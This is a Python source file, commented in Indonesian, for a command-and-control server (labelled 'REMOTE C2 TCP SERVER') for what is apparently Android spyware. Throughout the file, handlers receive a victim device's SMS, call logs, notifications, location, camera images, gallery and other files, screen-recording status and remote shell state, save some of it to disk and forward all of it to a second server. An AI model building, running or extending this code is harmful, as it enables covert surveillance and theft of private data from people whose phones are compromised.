#!/usr/bin/env python3
import socket
import json
import threading
import base64
from datetime import datetime
import time
import logging
import sys
import os
from colorama import init, Fore, Style
import signal
import requests

# --- Konfigurasi dari Environment Variable ---
TCP_PORT = int(os.environ.get('TCP_PORT', 9090))
SERVER2_URL = os.environ.get('SERVER2_URL', '').rstrip('/')
HOST = '0.0.0.0'

# --- Globals ---
client_socket = None
client_address = None
running = True
in_shell_mode = False
in_notification_mode = False
in_gallery_mode = False
device_current_dir = "/"
connected_devices = {}

# --- Setup ---
init(autoreset=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Buat direktori jika belum ada
for dir_name in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads']:
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

# --- Informasi Startup ---
def print_startup_info():
    print(Fore.CYAN + "=" * 80)
    print(Fore.CYAN + "             REMOTE C2 TCP SERVER (SERVER1)")
    print(Fore.CYAN + f"             Listening on port {TCP_PORT}")
    if SERVER2_URL:
        print(Fore.GREEN + f"             Forwarding to server2: {SERVER2_URL}")
    else:
        print(Fore.YELLOW + "             WARNING: SERVER2_URL not set! Web interface disabled")
    print(Fore.CYAN + "=" * 80)

print_startup_info()

# --- Fungsi untuk kirim data ke server2 ---
def forward_to_server2(data_type, payload):
    """Mengirim data ke Flask server (server2.py)"""
    if not SERVER2_URL:
        return
    
    if not client_address:
        return
    
    try:
        data_to_send = {
            'type': data_type,
            'payload': payload,
            'client_info': {
                'address': client_address[0] if client_address else 'unknown',
                'timestamp': datetime.now().isoformat()
            }
        }
        
        def send_request():
            try:
                response = requests.post(
                    f"{SERVER2_URL}/api/data",
                    json=data_to_send,
                    timeout=2
                )
                if response.status_code == 200:
                    logger.debug(f"Forwarded {data_type} to server2")
            except Exception as e:
                logger.debug(f"Forward error: {e}")
        
        threading.Thread(target=send_request, daemon=True).start()
            
    except Exception as e:
        logger.debug(f"Error in forward_to_server2: {e}")

# --- Data Handlers (tanpa UI) ---
def handle_device_info(info):
    logger.info(f"Device connected: {info.get('Model', 'Unknown')}")
    forward_to_server2('DEVICE_INFO', info)

def handle_notification(log):
    logger.info(f"Notification from {log.get('packageName', 'N/A')}")
    forward_to_server2('NOTIFICATION_DATA', {'notification': log})

def handle_sms(log):
    logger.info(f"SMS from {log.get('userSender', 'N/A')}")
    forward_to_server2('SMS_LOG', {'log': log})

def handle_call(log):
    logger.info(f"Call from {log.get('number', 'N/A')}")
    forward_to_server2('CALL_LOG', {'log': log})

def handle_image(log_data):
    try:
        filename = log_data.get('filename', f"image_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        filepath = os.path.join('captured_images', filename)
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(log_data.get('image_base64', '')))
        
        logger.info(f"Image saved: {filename}")
        forward_to_server2('IMAGE_DATA', {'image': log_data})
    except Exception as e:
        logger.error(f"Could not save image: {e}")

def handle_app_list(log_data):
    apps = log_data.get('apps', [])
    logger.info(f"Received {len(apps)} apps")
    forward_to_server2('APP_LIST', log_data)

def handle_gallery_page(log_data):
    files = log_data.get('files', [])
    logger.info(f"Gallery page with {len(files)} files")
    forward_to_server2('GALLERY_PAGE_DATA', log_data)

def handle_file_chunk(log_data, folder):
    try:
        filename = log_data.get('filename', 'downloaded_file')
        filepath = os.path.join(folder, filename)
        
        with open(filepath, 'ab') as f:
            f.write(base64.b64decode(log_data.get('chunk', '')))
        
        file_size = os.path.getsize(filepath)
        logger.debug(f"Receiving {filename}: {file_size} bytes")
        
    except Exception as e:
        logger.error(f"Could not write file chunk: {e}")

def handle_location(payload):
    url = payload.get('url')
    logger.info(f"Location: {url}")
    forward_to_server2('LOCATION_SUCCESS', {'url': url})

def handle_location_fail(payload):
    error = payload.get('error')
    logger.error(f"Location failed: {error}")
    forward_to_server2('LOCATION_FAIL', {'error': error})

def handle_recorder_started(payload):
    logger.info("Screen recording started")
    forward_to_server2('SCREEN_RECORDER_STARTED', {})

def handle_recorder_stopped(payload):
    logger.info("Screen recording stopped")
    forward_to_server2('SCREEN_RECORDER_STOPPED', {})

def handle_file_end(payload):
    logger.info(f"File download complete: {payload.get('file')}")
    forward_to_server2('GET_FILE_END', {'file': payload.get('file')})

def handle_gallery_end(payload):
    logger.info(f"Gallery image saved: {payload.get('file')}")
    forward_to_server2('GALLERY_IMAGE_END', {'file': payload.get('file')})

def handle_file_manager(payload):
    files = payload.get('files', [])
    logger.info(f"File manager: {len(files)} items")
    forward_to_server2('FILE_MANAGER_RESULT', {'files': files})

def handle_shell_ls(payload):
    files = payload.get('files', [])
    logger.info(f"Shell ls: {len(files)} items")
    forward_to_server2('SHELL_LS_RESULT', {'files': files})

def handle_shell_start(payload):
    global in_shell_mode, device_current_dir
    in_shell_mode = True
    device_current_dir = payload.get("current_dir", "/")
    logger.info(f"Shell mode started at {device_current_dir}")
    forward_to_server2('SHELL_MODE_STARTED', {'current_dir': device_current_dir})

def handle_shell_end(payload):
    global in_shell_mode
    in_shell_mode = False
    logger.info("Shell mode ended")
    forward_to_server2('SHELL_MODE_ENDED', {})

def handle_notif_start(payload):
    global in_notification_mode
    in_notification_mode = True
    logger.info("Notification mode started")
    forward_to_server2('NOTIFICATION_MODE_STARTED', {})

def handle_notif_end(payload):
    global in_notification_mode
    in_notification_mode = False
    logger.info("Notification mode ended")
    forward_to_server2('NOTIFICATION_MODE_ENDED', {})

def handle_gallery_start(payload):
    global in_gallery_mode
    in_gallery_mode = True
    logger.info("Gallery mode started")
    forward_to_server2('GALLERY_MODE_STARTED', {})

def handle_gallery_end_mode(payload):
    global in_gallery_mode
    in_gallery_mode = False
    logger.info("Gallery mode ended")
    forward_to_server2('GALLERY_MODE_ENDED', {})

def handle_gallery_scan(payload):
    logger.info("Gallery scanning started")
    forward_to_server2('GALLERY_SCAN_STARTED', {})

def handle_gallery_complete(payload):
    count = payload.get('image_count')
    logger.info(f"Gallery scan complete: {count} images")
    forward_to_server2('GALLERY_SCAN_COMPLETE', {'image_count': count})

def handle_cd_success(payload):
    global device_current_dir
    device_current_dir = payload.get("current_dir", "/")
    logger.info(f"Shell cd to {device_current_dir}")
    forward_to_server2('SHELL_CD_SUCCESS', {'current_dir': device_current_dir})

def handle_incoming_data(data):
    global in_shell_mode, in_notification_mode, in_gallery_mode, device_current_dir
    
    try:
        payload = json.loads(data).get('data', {})
        log_type = payload.get('type', 'UNKNOWN')
        
        logger.info(f"Received: {log_type}")

        handler_map = {
            'SMS_LOG': lambda p: handle_sms(p.get('log')),
            'CALL_LOG': lambda p: handle_call(p.get('log')),
            'IMAGE_DATA': lambda p: handle_image(p.get('image')),
            'APP_LIST': handle_app_list,
            'DEVICE_INFO': lambda p: handle_device_info(p.get('info')),
            'GET_FILE_CHUNK': lambda p: handle_file_chunk(p.get('chunk_data'), 'device_downloads'),
            'GALLERY_IMAGE_CHUNK': lambda p: handle_file_chunk(p.get('chunk_data'), 'gallery_downloads'),
            'NOTIFICATION_DATA': lambda p: handle_notification(p.get('notification')),
            'LOCATION_SUCCESS': handle_location,
            'LOCATION_FAIL': handle_location_fail,
            'SCREEN_RECORDER_STARTED': handle_recorder_started,
            'SCREEN_RECORDER_STOPPED': handle_recorder_stopped,
            'GET_FILE_END': handle_file_end,
            'GALLERY_IMAGE_END': handle_gallery_end,
            'FILE_MANAGER_RESULT': handle_file_manager,
            'SHELL_LS_RESULT': handle_shell_ls,
            'SHELL_MODE_STARTED': handle_shell_start,
            'SHELL_MODE_ENDED': handle_shell_end,
            'NOTIFICATION_MODE_STARTED': handle_notif_start,
            'NOTIFICATION_MODE_ENDED': handle_notif_end,
            'GALLERY_MODE_STARTED': handle_gallery_start,
            'GALLERY_MODE_ENDED': handle_gallery_end_mode,
            'GALLERY_SCAN_STARTED': handle_gallery_scan,
            'GALLERY_SCAN_COMPLETE': handle_gallery_complete,
            'GALLERY_PAGE_DATA': handle_gallery_page,
            'SHELL_CD_SUCCESS': handle_cd_success,
        }
        
        if log_type in handler_map:
            handler_map[log_type](payload)
        else:
            logger.warning(f"Unknown type: {log_type}")
            forward_to_server2('UNKNOWN', payload)

    except json.JSONDecodeError:
        logger.error(f"Invalid JSON: {data[:100]}...")
    except Exception as e:
        logger.error(f"Handler error: {e}")

# --- Core TCP Server ---
def client_listener(sock):
    """Thread untuk handle koneksi client"""
    buffer = ""
    while running and sock:
        try:
            data = sock.recv(16384).decode('utf-8', errors='ignore')
            if not data:
                break
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip():
                    handle_incoming_data(line.strip())
        except ConnectionResetError:
            break
        except socket.timeout:
            continue
        except Exception as e:
            logger.error(f"Listener error: {e}")
            break
    
    logger.info("Client disconnected")
    global client_socket, in_shell_mode, in_notification_mode, in_gallery_mode
    client_socket = None
    in_shell_mode = False
    in_notification_mode = False
    in_gallery_mode = False
    if client_address:
        forward_to_server2('CONNECTION', {'status': 'disconnected', 'address': client_address[0]})

def main():
    """Main function"""
    global client_socket, client_address, running
    
    def signal_handler(sig, frame):
        global running
        running = False
        logger.info("Shutting down...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, TCP_PORT))
        server_socket.listen(5)
        logger.info(f"Listening on {HOST}:{TCP_PORT}")
        
        while running:
            try:
                server_socket.settimeout(1.0)
                conn, addr = server_socket.accept()
                conn.settimeout(5.0)
                client_socket, client_address = conn, addr
                
                logger.info(f"Device connected from {addr[0]}:{addr[1]}")
                
                forward_to_server2('CONNECTION', {
                    'status': 'connected',
                    'address': addr[0],
                    'port': addr[1]
                })
                
                listener_thread = threading.Thread(target=client_listener, args=(conn,), daemon=True)
                listener_thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"Accept error: {e}")
                time.sleep(1)
        
    except Exception as e:
        logger.error(f"Server error: {e}")
    finally:
        server_socket.close()
        logger.info("Server shut down")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Stopped by user")
        sys.exit(0)
